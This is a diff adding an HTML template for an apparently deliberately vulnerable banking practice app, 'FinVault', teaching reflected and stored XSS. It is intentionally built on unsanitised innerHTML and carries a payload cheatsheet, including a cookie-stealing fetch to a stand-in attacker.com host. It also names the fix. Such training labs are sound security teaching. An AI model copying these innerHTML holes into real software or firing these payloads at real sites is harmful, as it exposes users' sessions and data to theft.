@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FinVault — Search Transactions</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet">
+    <link href="/css/style.css" rel="stylesheet">
+</head>
+<body class="app-body">
+
+<nav th:replace="~{fragments/navbar :: navbar}"></nav>
+
+<div class="container-fluid py-4">
+
+    <!-- VULNERABILITY CALLOUT -->
+    <div class="vuln-badge mb-4">
+        <i class="bi bi-bug-fill me-2"></i>
+        <strong>VULNERABILITY #2: Cross-Site Scripting (XSS)</strong> —
+        Search term and transaction descriptions are rendered via <code>innerHTML</code> without sanitization.
+        Reflected XSS via the search box. Stored XSS via transaction descriptions.
+    </div>
+
+    <div class="row g-4">
+        <div class="col-lg-8">
+
+            <!-- Search Form -->
+            <div class="app-card mb-4">
+                <div class="app-card-header">
+                    <h5 class="mb-0"><i class="bi bi-search text-gold me-2"></i>Search Transactions</h5>
+                    <p class="text-muted small mb-0">Search term is reflected directly into the DOM via <code>innerHTML</code></p>
+                </div>
+                <div class="card-body">
+                    <form th:action="@{/search}" method="get" class="mb-3">
+                        <div class="input-group">
+                            <input type="text" class="form-control bg-dark text-light border-secondary"
+                                   name="q" id="searchInput"
+                                   th:value="${query}"
+                                   placeholder="Search transactions...">
+                            <button type="submit" class="btn btn-gold">
+                                <i class="bi bi-search me-1"></i>Search
+                            </button>
+                        </div>
+                        <div class="form-text text-warning mt-2">
+                            <i class="bi bi-exclamation-triangle"></i>
+                            Try: <code>&lt;img src=x onerror=alert('XSS')&gt;</code> &nbsp;|&nbsp;
+                            <code>&lt;svg onload=alert(document.cookie)&gt;</code>
+                        </div>
+                    </form>
+
+                    <!-- Reflected XSS: search term rendered via innerHTML -->
+                    <div th:if="${query != null and query != ''}">
+                        <div class="d-flex align-items-center mb-3">
+                            <span class="text-muted me-2">Results for:</span>
+                            <!-- VULNERABILITY: innerHTML used here in JS below -->
+                            <span id="search-term" class="badge bg-dark border border-secondary text-light px-3 py-2"></span>
+                            <span class="text-muted ms-2 small"
+                                  th:text="'(' + ${resultCount} + ' found)'"></span>
+                        </div>
+
+                        <!-- Results table — descriptions rendered via innerHTML (stored XSS) -->
+                        <div class="table-responsive" th:if="${results != null and not #lists.isEmpty(results)}">
+                            <table class="table table-dark table-hover">
+                                <thead>
+                                <tr>
+                                    <th>Description</th>
+                                    <th>Type</th>
+                                    <th>Date</th>
+                                    <th class="text-end">Amount</th>
+                                </tr>
+                                </thead>
+                                <tbody id="results-tbody">
+                                <!-- Populated via JS with innerHTML (stored XSS) -->
+                                </tbody>
+                            </table>
+                        </div>
+
+                        <div th:if="${results != null and #lists.isEmpty(results)}"
+                             class="text-center text-muted py-4">
+                            <i class="bi bi-search fs-2 d-block mb-2"></i>
+                            No transactions matched your search.
+                        </div>
+                    </div>
+
+                    <div th:unless="${query != null and query != ''}" class="text-center text-muted py-4">
+                        <i class="bi bi-search fs-2 d-block mb-2"></i>
+                        Enter a search term above to find transactions.
+                    </div>
+                </div>
+            </div>
+
+            <!-- Stored XSS: Add a Transaction -->
+            <div class="app-card border-danger">
+                <div class="app-card-header border-danger">
+                    <h5 class="mb-0 text-danger"><i class="bi bi-plus-circle me-2"></i>Add Transaction (Stored XSS Vector)</h5>
+                    <p class="text-muted small mb-0">
+                        Descriptions are stored without sanitization and rendered via <code>innerHTML</code> when searched.
+                        Inject a script payload in the description field.
+                    </p>
+                </div>
+                <div class="card-body">
+                    <div id="addTxSuccess" class="alert alert-success d-none"></div>
+                    <div class="row g-2">
+                        <div class="col-md-6">
+                            <label class="form-label text-light">Description (XSS payload here)</label>
+                            <input type="text" class="form-control bg-dark text-light border-danger"
+                                   id="txDescription"
+                                   placeholder='&lt;img src=x onerror=alert("stored XSS")&gt;'>
+                        </div>
+                        <div class="col-md-3">
+                            <label class="form-label text-light">Amount</label>
+                            <input type="number" class="form-control bg-dark text-light border-secondary"
+                                   id="txAmount" value="1.00" step="0.01">
+                        </div>
+                        <div class="col-md-3">
+                            <label class="form-label text-light">Type</label>
+                            <select class="form-select bg-dark text-light border-secondary" id="txType">
+                                <option value="DEBIT">DEBIT</option>
+                                <option value="CREDIT">CREDIT</option>
+                            </select>
+                        </div>
+                    </div>
+                    <button class="btn btn-danger mt-3" onclick="addTransaction()">
+                        <i class="bi bi-plus-lg me-2"></i>Store Transaction (with XSS payload)
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- XSS Info Sidebar -->
+        <div class="col-lg-4">
+            <div class="app-card mb-3">
+                <div class="app-card-header">
+                    <h5 class="mb-0 text-gold"><i class="bi bi-journal-code me-2"></i>XSS Payload Cheatsheet</h5>
+                </div>
+                <div class="card-body">
+                    <p class="text-muted small mb-3">Paste these into the search box for reflected XSS:</p>
+
+                    <div class="payload-item" onclick="usePayload(this)">
+                        <div class="payload-label">Basic Alert</div>
+                        <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+                    </div>
+                    <div class="payload-item" onclick="usePayload(this)">
+                        <div class="payload-label">Image Error Handler</div>
+                        <code>&lt;img src=x onerror=alert(1)&gt;</code>
+                    </div>
+                    <div class="payload-item" onclick="usePayload(this)">
+                        <div class="payload-label">Cookie Theft</div>
+                        <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code>
+                    </div>
+                    <div class="payload-item" onclick="usePayload(this)">
+                        <div class="payload-label">SVG Payload</div>
+                        <code>&lt;svg onload=alert(document.domain)&gt;</code>
+                    </div>
+                    <div class="payload-item" onclick="usePayload(this)">
+                        <div class="payload-label">JWT Token Theft</div>
+                        <code>&lt;img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)"&gt;</code>
+                    </div>
+
+                    <hr class="border-secondary">
+                    <p class="text-muted small mb-2">For stored XSS, use the "Add Transaction" form below with:</p>
+                    <div class="payload-item" onclick="useStoredPayload(this)">
+                        <div class="payload-label">Stored Alert</div>
+                        <code>&lt;b onmouseover=alert('stored!')&gt;hover me&lt;/b&gt;</code>
+                    </div>
+                </div>
+            </div>
+
+            <div class="app-card">
+                <div class="app-card-header">
+                    <h5 class="mb-0"><i class="bi bi-code-slash text-gold me-2"></i>Vulnerable Code</h5>
+                </div>
+                <div class="card-body">
+                    <p class="text-muted small">The vulnerability is in <code>main.js</code>:</p>
+                    <pre class="text-warning small mb-0"><code>// REFLECTED XSS
+document.getElementById('search-term')
+  .innerHTML = query; // ← unsafe!
+
+// STORED XSS
+tr.innerHTML = `&lt;td&gt;${tx.description}&lt;/td&gt;`;
+// ↑ description from DB, unsanitized</code></pre>
+                    <hr class="border-secondary">
+                    <p class="text-muted small">Fix: use <code>textContent</code> instead of <code>innerHTML</code>, or sanitize with DOMPurify.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+    // -------------------------------------------------------------------------
+    // VULNERABILITY: Reflected XSS via innerHTML
+    // The search query from the URL is placed directly into innerHTML
+    // -------------------------------------------------------------------------
+    const urlParams = new URLSearchParams(window.location.search);
+    const query = urlParams.get('q');
+
+    if (query) {
+        // VULNERABLE: innerHTML renders any HTML/script in the query parameter
+        document.getElementById('search-term').innerHTML = query;
+    }
+
+    // -------------------------------------------------------------------------
+    // VULNERABILITY: Stored XSS via innerHTML in table rows
+    // Transaction descriptions from the DB are rendered unsanitized
+    // -------------------------------------------------------------------------
+    const rawResults = /*[[${results}]]*/ null;
+
+    if (rawResults && rawResults.length > 0) {
+        const tbody = document.getElementById('results-tbody');
+        if (tbody) {
+            rawResults.forEach(tx => {
+                const tr = document.createElement('tr');
+                const amountClass = tx.transactionType === 'CREDIT' ? 'text-success' : 'text-danger';
+                const amountPrefix = tx.transactionType === 'CREDIT' ? '+' : '';
+                const date = tx.createdAt ? tx.createdAt.substring(0, 10) : '';
+                const badgeClass = tx.transactionType === 'CREDIT' ? 'bg-success' : 'bg-danger';
+
+                // VULNERABILITY: tx.description is rendered via innerHTML — stored XSS
+                tr.innerHTML = `
+                    <td>${tx.description}</td>
+                    <td><span class="badge ${badgeClass}">${tx.transactionType}</span></td>
+                    <td class="text-muted small">${date}</td>
+                    <td class="text-end fw-bold ${amountClass}">${amountPrefix}$${Math.abs(tx.amount).toFixed(2)}</td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+    }
+
+    function addTransaction() {
+        const description = document.getElementById('txDescription').value;
+        const amount      = document.getElementById('txAmount').value;
+        const type        = document.getElementById('txType').value;
+
+        fetch('/api/transactions/add', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({description, amount: parseFloat(amount), type})
+        })
+        .then(r => r.json())
+        .then(data => {
+            const el = document.getElementById('addTxSuccess');
+            el.classList.remove('d-none');
+            // VULNERABILITY: response message reflected via innerHTML
+            el.innerHTML = '<i class="bi bi-check-circle me-2"></i>Transaction stored! Now search for it to trigger stored XSS. Response: ' + data.message;
+        });
+    }
+
+    function usePayload(el) {
+        const code = el.querySelector('code').textContent;
+        document.getElementById('searchInput').value = code;
+    }
+
+    function useStoredPayload(el) {
+        const code = el.querySelector('code').textContent;
+        document.getElementById('txDescription').value = code;
+    }
+</script>
+</body>
+</html>
